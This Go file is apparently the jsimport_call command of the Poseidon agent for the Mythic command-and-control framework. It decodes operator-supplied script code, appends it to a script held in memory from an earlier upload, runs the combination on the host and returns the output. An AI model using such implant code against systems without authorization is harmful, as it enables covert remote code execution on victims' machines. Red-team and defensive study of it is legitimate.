package jsimport_call

import (
	// Standard
	"encoding/base64"
	"encoding/json"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type JxaRun interface {
	Success() bool
	Result() string
}

type Arguments struct {
	Code   string `json:"code"`
	FileID string `json:"file_id"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	codeBytes, err := base64.StdEncoding.DecodeString(args.Code)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	code := task.Job.GetSavedFile(args.FileID)
	if code == nil {
		msg.UserOutput = "Failed to find that file in memory, did you upload with jsimport first?"
		msg.Status = "error"
		msg.Completed = true
		task.Job.SendResponses <- msg
		return
	}
	codeString := string(code) + "\n" + string(codeBytes)
	r, err := runCommand(codeString)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput = r.Result()
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
